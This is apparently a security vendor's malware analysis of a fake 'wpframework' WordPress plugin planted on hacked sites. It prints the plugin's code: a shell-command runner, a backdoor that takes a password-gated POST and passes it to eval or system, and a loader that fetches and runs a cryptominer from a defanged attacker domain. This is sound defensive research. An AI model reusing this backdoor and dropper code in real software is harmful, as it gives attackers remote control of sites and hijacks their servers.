@@ -1,0 +1,90 @@
+Cryptominers & Backdoors Found in Fake Plugins
+
+When cleaning websites, we regularly find phishing pages, malicious code injected into files, and SEO spam. However, over the past couple of months we’ve also noticed a considerable increase in the number of malicious plugins which have been added to compromised websites as well.
+These plugins appear to be legitimate, but inspecting the code reveals that the plugin is not just an innocent plugin at all. The fake plugins are actually part of the attack—and in most cases used as a backdoor for the attacker to maintain access to the compromised website environment, even after the initial infection vector has been cleaned up.
+Earlier this year, I wrote about another incident concerning a malicious plugin that was encrypting WordPress posts, but in that case the plugin was more of a tool to access the posts and encrypt them—not a backdoor as documented below.
+Fake “wpframework” Plugin Installed on Hacked Sites
+We recently discovered a number of compromised websites containing a plugin called “wpframework”. This plugin is being planted by bad actors to gain and maintain unauthorized access to the site environment.
+The malicious file includes the following information in it’s header:
+/.
+Plugin Name: WordPress Framework
+Plugin URI: http://wordpress.org/#
+Description: WordPress Framework
+Author: wordpress.org
+Version: 1.0
+Author URI: http://wordpress.org
+*/
+
+We first detected this malware during September, 2019. Let’s take a look at the plugin and see what it does.
+Malicious Plugin Behavior
+Once installed, the plugin initially checks to see if there are any disabled functions. It then scans for the usual system, exec, and passthru functions, which allow for command execution on the server level.
+function favailable($f) {
+if (in_array(strtolower(ini_get('safe_mode')), array('on', '1'), true) || (!function_exists($f))) {
+return false;
+}
+$disabled_functions = explode(',', ini_get('disable_functions'));
+$en = !in_array($f, $disabled_functions);
+return ($en) ? true : false;
+}
+function r($c) {
+if (favailable('system')) {
+system($c);
+return true;
+} else if (favailable('exec')) {
+exec($c);
+return true;
+} else if (favailable('passthru')) {
+passthru($c);
+return true;
+} else {
+return false;
+}
+}
+
+Additional code has also been included to ensure that only the bot master can execute commands.
+The plugin compares the MD5 hash of a submitted POST string and only continues if it matches an existing MD5 hash that has been hard coded inside.
+if (isset($_POST['info'])){
+if  (md5($_POST['info']) === '06f32c73708494a80ed97e7ef44e444a') {
+if (isset($_POST['a'])) {
+$a=base64_decode($_POST['a']);
+if ($a != false) r($a);
+die;
+}
+if (isset($_POST['b'])) {
+$b=base64_decode($_POST['b']);
+if ($b != false) eval($b);
+die;
+}
+}
+die;
+}
+
+Server commands from the “a” POST parameter and arbitrary PHP code from the “b” POST parameter can be executed here, which is how this plugin can also be used as a backdoor.
+Multios Cryptominer Execution
+While most backdoors typically only care about PHP execution, the following part of the code explains why this plugin wants to execute server commands.
+When the plugin downloads, it changes permissions and runs a Linux executable binary file (64 or 32-bit version).
+$x="";
+if ($is64) {
+$x=@file_get_contents("hxxp://xfer.abcxyz[.]stream/64");
+} else {
+$x=@file_get_contents("hxxp://xfer.abcxyz[.]stream/32");
+}
+if ((strlen($x)>0) and (file_put_contents("./".$file,$x)!=false)) {
+if (chmod("./".$file,0777)) {
+r("./{$file} {$e}");
+} else {
+r("chmod 0777 {$file}");
+r("./{$file} {$e}");
+}
+When reviewing this specific ticket, we noticed that the malicious plugin directory already included a binary file. The file was a cryptocurrency miner and identified by multiple AV vendors.
+Multios.Coinminer.Miner-6781728-2
+
+ELF:BitCoinMiner-HE [Trj]
+
+Linux.Application.CoinMiner.AH
+
+We suspect that this file is likely the same one from “xfer.abcxyz.stream”, however the referenced domain doesn’t exist any longer. This is simply our best guess at the time of writing.
+Conclusion
+Malware can hide anywhere—even within a plugin, which many webmasters might not suspect.
+We have seen many cases where website owners replace the WordPress core files during a malware cleanup, but keep their existing plugins and themes. By simply migrating their third-party extensions to a new site, they maintain the backdoor and get reinfected in the process.
+What is especially concerning about this particular fake plugin is that it can be easily used to just run just about any code through the eval function. The good news is that monitoring for changes to the active plugins on your website and unauthorized access is a good way to mitigate risk and prevent this from happening. The Sucuri Security WordPress plugin can accomplish this with its monitoring and hardening features. Using a web application firewall can also prevent most attacks and further restrict unauthorized access to the WordPress administrator dashboard.
